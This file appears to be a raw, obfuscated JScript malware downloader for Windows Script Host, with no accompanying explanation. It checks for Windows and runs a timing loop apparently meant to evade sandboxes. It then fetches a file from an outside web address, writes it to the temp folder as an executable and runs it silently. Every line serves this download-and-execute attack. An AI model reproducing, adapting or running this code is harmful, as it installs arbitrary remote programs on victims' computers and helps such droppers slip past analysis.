var f = false;
var Vz = "CreateObject";
var bi = function cv() {return WScript[Vz]("WScript.Shell");}(), U0 = 11;
var m0 = "MSXML2.XMLHTTP";
var vA = 2123213;
var A = 0;
function m(LY){bi["Run"](LY, A, A);};
function p(){return "" + m0;};
function XU(pb, CO){A = A * 1; return pb - CO;};
function mi(){return Vz;};
/*@cc_on
  @if (@_win32 || @_win64)
    f = true;
  @end
@*/
if (f)
{
var iZ = "";
function U(){return 22;};
var i = 0; var e = 0;
function C()
{
var hF = new this["Date"]();
var D1 = hF["getUTCMilliseconds"]();
WScript["Sleep"](U());
var hF = new this["Date"]();
var p0 = hF["getUTCMilliseconds"]();
WScript["Sleep"](U());
var hF = new this["Date"]();
var D0 = hF["getUTCMilliseconds"]();
var i = "dQ";
i = XU(p0, D1);
var e = "D";
e = XU(D0, p0);
iZ = "open";
return XU(i, e);
}
var b = false;
var XM = false;
for (var G = A; G < U() * 1; G++){if (C() != A){
b = true; 
e = "31" + 11 * i + e; 
XM = true; 
break;
}}
function sI() {return ((b == true) && (b == XM)) ? 1 : A;};
if (b && sI() && XM){
function pi() {return bi["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "QCtKFfhZZDq.exe";};
 MA = p();
 Nu = WScript[Vz](MA);
 var P = 1;
 while (P){
try {
Nu[iZ]("GET", "http://blog.saletron.net/li9soz", false);
Nu["send"]();
yH = "Sleep";
for (;;){WScript[yH](U() * 11); if (Nu["readystate"] >= 2 * 2) break;};
P = A;
} catch(oJ){};
}
function M(rZ) {var B = (1, 2, 3, 4, 5, rZ); return B;};
a = WScript[mi()]("ADODB.Stream");
MA = a;
MA[iZ]();
MA["type"] = M(1);
MA["write"](Nu["ResponseBody"]);
a["position"] = M(A);
MA["Save" + "ToFile"](pi(), 2);
a["c"+"lose"]();
I = pi();
m(I);
}
}

